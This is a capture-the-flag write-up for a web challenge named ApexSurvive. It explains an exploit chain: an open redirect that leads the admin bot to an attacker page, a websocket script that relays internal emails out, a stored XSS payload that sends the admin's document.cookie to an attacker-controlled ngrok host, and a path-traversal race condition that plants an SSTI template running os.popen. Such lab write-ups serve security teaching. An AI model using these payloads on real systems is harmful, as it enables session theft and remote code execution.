# Apexsurvie

>In a dystopian future, a group of Maze Runners faces a deadly labyrinth. To navigate it, they need vital intel on maze shifts and hidden passages. Your mission: hack into ApexSurvive, the black-market hub for survival gear, to obtain the key information. The Maze Runners' freedom depends on your skills. Time to infiltrate and hack the maze's lifeline. Good luck, hacker.

Difficulty: __Insane__  
Source Code: Provided

__Note:__ _All referenced files have been provided in the challenge._

Structure image showing the points we will use to explore the application and capture the flag.
![fluxo apexsurvive](imgs/ApexSurvive.png)
_Image does not show all application endpoints, only the ones important for exploiting._

Analyzing the application, we can see that there are three main services. 
1. A web project running on port 1337. This web service consists of two main endpoints, `/challenge` which is the main application, and `/email` which is a site showing all received emails. It is where the initial access is validated.
2. Mailhog is an email server.
3. Bot is an application that simulates the validation of an administrator when the `/challenge/api/report` endpoint is called. It opens a headless browser, authenticates as admin, and accesses the `/challenge/product/{productID}` endpoint.


## Authentication and Authorization

Analyzing the application carefully, we can see that it is protected by an authentication and authorization process. New users need to validate their email to enter the application.

In the `./challenge/application/middleware/middlewares.py` file, we can see all authorization methods.
```python
def isVerified(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        decodedToken = kwargs.get('decodedToken')

        user = getUser(decodedToken['id'])

        if user['isConfirmed'] == 'unverified':
            return redirect('/challenge/settings?message=verify')
        return f(*args, **kwargs)
    return decorator

def isInternal(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        decodedToken = kwargs.get('decodedToken')

        user = getUser(decodedToken['id'])

        if user['isInternal'] != 'true':
            return response('Unauthorised access detected!'), 401
        return f(*args, **kwargs)
    return decorator

def isAdmin(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        decodedToken = kwargs.get('decodedToken')

        user = getUser(decodedToken['id'])
        
        if user['isAdmin'] != 'true':
            return response('Unauthorised access detected!'), 401
        return f(*args, **kwargs)
    return decorator
```

## First step: Internal

This step is the most difficult of all.
The only way to obtain the Internal profile is to confirm a user with an email `@apexsurvive.htb`.

As we can verify in the code snippet `./challenge/application/database.py`:
```python
def verifyEmail(token):
    user = query('SELECT * from users WHERE confirmToken = %s', (token, ), one=True)

    if user and user['isConfirmed'] == 'unverified':
        _, hostname = parseaddr(user['unconfirmedEmail'])[1].split('@', 1)
        
        if hostname == 'apexsurvive.htb':
            query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="", isInternal="true" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
        else:
            query('UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail="", confirmToken="" WHERE id=%s', ('verified', user['unconfirmedEmail'], user['id'],))
        
        mysql.connection.commit()
        return True
```

However, the `/email` filters all emails that are not sent to `test@email.htb`. If we register a user using `@apexservive.htb`, we won't be able to view the email with the confirmation code.

`./email-app/routes/index.js`
```javascript
router.get('/email/', async (req, res) => {
    const result = await mailhog.messages(0, 10)

    mails = []

    for (let item of result.items) {
        if (item.to == 'test@email.htb') {
            mails.push(item);
        }
    }

    return res.render('home.html', {result: mails});
});
```

The email server is a Mailhog. Analyzing the [source code](https://github.com/mailhog/MailHog-Server), we can identify an endpoint called `/api/v2/websocket`. This endpoint allows us to establish a websocket connection and register as a listener of Mailhog. So, every time an email is sent to Mailhog, it will send to all listeners.

Mailhog API is running on port 9000, which is not exposed.
According to `./config/supervisord.conf
```conf
[program:mailhog]
command=/MailHog_linux_amd64 -api-bind-addr 127.0.0.1:9000 -ui-bind-addr 127.0.0.1:9000  -maildir-path /var/mail/ -storage maildir
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

The following script will use the `/api/v2/websocket` endpoint to establish a websocket connection, monitor, and capture all events sent to the listeners, forwarding them to our server.
```html
<html>
    <head>
    </head>
    <body>
        <script>
            function sendMessage(message) {
                fetch('/captureEmail?data=' + btoa(message))
            }
            
            const websocket = new WebSocket("ws://127.0.0.1:9000/api/v2/websocket");
            websocket.onmessage = function(event) {
                sendMessage(event.data);
            };

            websocket.onclose = function(event) {
                sendMessage('close');
            };
        </script>
    </body>
</html>
```

To execute our script within the server, we need to understand the initial vulnerabilities of the application.

Starting with the code `./challenge/application/blueprints/routes.py`. We can validate that the `/challenge/external` endpoint receives the url parameter and redirects to it.
```python
@web.route('/external')
def external():
    url = request.args.get('url', '')

    if not url:
        return redirect('/')
    
    return redirect(url)
```

In the code `./challenge/application/blueprints/api.py`.
```python
@api.route('/report', methods=['POST'])
@isAuthenticated
@isVerified
@antiCSRF
@sanitizeInput
def reportProduct(decodedToken):
    productID = request.form.get('id', '')
   
    if not productID:
        return response('All fields are required!'), 401
    
    adminUser = getUser('1')

    params = {'productID': productID, 'email': adminUser['email'], 'password': adminUser['password']}

    requests.get('http://127.0.0.1:8082/visit', params=params)

    return response('Report submitted! Our team will review it')
```

We can see that the productId parameter is not typed, so we can send any type of information to the application, including a `string`. That means, we can send the following code: `../external?url={YOUR_SERVER}` which will be sent to the bot `/visit`.

In the bot, the `productID` is concatenated in the URL. When our `productID` is concateneted, the `client.get` will try to open the following URL: `http://127.0.0.1:1337/challenge/product/../external?url={YOUR_SERVER}`.

This way, the admin's browser will be redirected to our server, and the script will be started, opening a websocket connection and redirecting all received emails to our server.
`./bot/app.py`
```python
@app.route('/visit')
def visit():
    productID = request.args.get('productID')
    email = request.args.get('email')
    password = request.args.get('password')

    thread = threading.Thread(target=bot, args=(productID, email, password))
    thread.start()
    return 'OK'

def bot(productID, email, password):
    chrome_options = Options()

    prefs = {
    "download.prompt_for_download": True,
    "download.default_directory": "/dev/null"
    }

    chrome_options.add_experimental_option(
        "prefs", prefs
    )

    """
    hidden code
    """
    
    client = webdriver.Chrome(options=chrome_options)
    
    client.get(f"https://127.0.0.1:1337/challenge/")

    time.sleep(3)
    client.find_element(By.ID, "email").send_keys(email)
    client.find_element(By.ID, "password").send_keys(password)
    client.execute_script("document.getElementById('login-btn').click()")

    time.sleep(3)
    client.get(f"https://127.0.0.1:1337/challenge/home")
    time.sleep(3)
    client.get(f"https://127.0.0.1:1337/challenge/product/{productID}")
    time.sleep(120)

    client.quit()
```

![fluxo Internal](imgs/internal-step.png)

## Second step: Administrator

Things start to get easer from here.

By obtaining access as Internal, we can see that we have access to new endpoints.
`./challenge/application/blueprints/routes.py`
```python
@web.route('/product/addProduct')
@isAuthenticated
@isVerified
@isInternal
def addProduct(decodedToken):
    user = getUser(decodedToken.get('id'))
    return render_template('addProduct.html', user=user, antiCSRFToken=decodedToken.get('antiCSRFToken'))
```
`./challenge/application/blueprints/api.py`
```python
@api.route('/addItem', methods=['POST'])
@isAuthenticated
@isVerified
@isInternal
@antiCSRF
@sanitizeInput
def addItem(decodedToken):
    name = request.form.get('name', '')
    price = request.form.get('price', '')
    description = request.form.get('description', '')
    image = request.form.get('imageURL', '')
    note = request.form.get('note', '')
    seller = request.form.get('seller', '')

    if any(value == '' for value in [name, price, description, image, note, seller]):
        return response('All fields are required!'), 401

    newProduct = addProduct(name, image, description, price, seller, note)

    if newProduct:
        return response('Product Added')
    
    return response('Something went wrong!')
```

We realize that, as Internal, we can add new products.

Analyzing the code `./challenge/application/templates/product.html` 
```html
<script>
    let note = `{{ product.note | safe }}`;
    const clean = DOMPurify.sanitize(note, {FORBID_ATTR: ['id', 'style'], USE_PROFILES: {html:true}});

    document.getElementById('note').innerHTML += clean;
</script>
```

We can see that the snippet ``let note = `{{product.note | safe }}`; `` is vulnerable to __XSS__. due to the possibility of `product.note` having the character `` ` ``.

Example: `product.note` = ``<h1>Hello<h1>`; alert(1); var A =  `A``
The result will be as follows:
```html
<script>
    let note = `<h1>Hello<h1>`; alert(1); var A =  `A`;
</script>
```

The idea here is the same: create a product with `note` containing our __XSS__ (``<span>Hello</span>`;fetch('{self.ngrok}/receive?data='+btoa(document.cookie));var i = `A``). Direct the page of the new product to the Admin via the `/challenge/api/report` endpoint.

When the bot opens the page as an administrator, it will execute our __XSS__, collecting the `document.cookie` and sending it to our server.

## Final step: Race Condition

Despite being conceptually simple, this step is the most challenging to execute.

As an administrator, we can use the following endpoints:
`./challenge/application/blueprints/route.py`
```python
@web.route('/admin/contracts')
@isAuthenticated
@isVerified
@isInternal
@isAdmin
def addContract(decodedToken):
    user = getUser(decodedToken.get('id'))
    return render_template('addContracts.html', user=user, antiCSRFToken=decodedToken.get('antiCSRFToken'))
```
`./challenge/application/blueprints/api.py`
```python
@api.route('/addContract', methods=['POST'])
@isAuthenticated
@isVerified
@isInternal
@isAdmin
@antiCSRF
@sanitizeInput
def addContract(decodedToken):
    name = request.form.get('name', '')

    uploadedFile = request.files['file']

    if not uploadedFile or not name:
        return response('All files required!')
    
    if uploadedFile.filename == '':
        return response('Invalid file!')

    uploadedFile.save('/tmp/temporaryUpload')

    isValidPDF = checkPDF()

    if isValidPDF:
        try:
            filePath = os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
            with open(filePath, 'wb') as wf:
                with open('/tmp/temporaryUpload', 'rb') as fr:
                    wf.write(fr.read())

            return response('Contract Added')
        except Exception as e:
            print(e, file=sys.stdout)
            return response('Something went wrong!')
    
    return response('Invalid PDF! what are you trying to do?')
```

This new profile allows uploading PDF files to the server.

The application performs the following steps:
1. Validates if all __form__ fields are filled.
2. Saves the received file temporarily in `/tmp/temporaryUpload`.
3. Reads the file `/tmp/temporaryUpload` and validates if it is a PDF using the `pyPDF2` library.
4. If the file is a PDF, it will be copied from `/tmp/temporaryUpload` to `current_app.root_path + contracts + uploadedFile.filename`.
	1. Where `current_app.root_path` is the root of the application.
	2. `uploadFile.filename` is the name of the received file.

```python
filePath = os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
with open(filePath, 'wb') as wf:
    with open('/tmp/temporaryUpload', 'rb') as fr:
        wf.write(fr.read())
```

Firstly, we can see that the file is transferred from the temporary folder to the application only if the file is indeed a PDF.

Secondly, `os.path.join` ensures the absolute path of the file, and `uploadedFile.filename` can be manipulated by us.

We can expect the following scenario. By sending the file with the name (`uploadedFile.filename`) `../templates/`info.html``, the filePath will be as follows: `/app/application/contracts/../templates/info.html`, meaning we will overwrite the original `/app/application/templates/info.html` with the file we sent to the server.

So, we can exploit a vulnerability called __Race Condition__.
The idea is to send multiple uploads, both of a legitimate PDF and an `info.html` with __SSTI__ to capture the flag.
Our version of `info.html`:
```html
<html>
<head>
</head>
<body>
    {{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}
</body>
</html>
```

The goal is to generate concurrency in the application so that when it receives a legitimate PDF file, the temporary file is overwritten by our `info.html` code only when it is about to copy the temporary file into the application.

When the __Race Condition__ succeeds, the `/` endpoint will return the flag.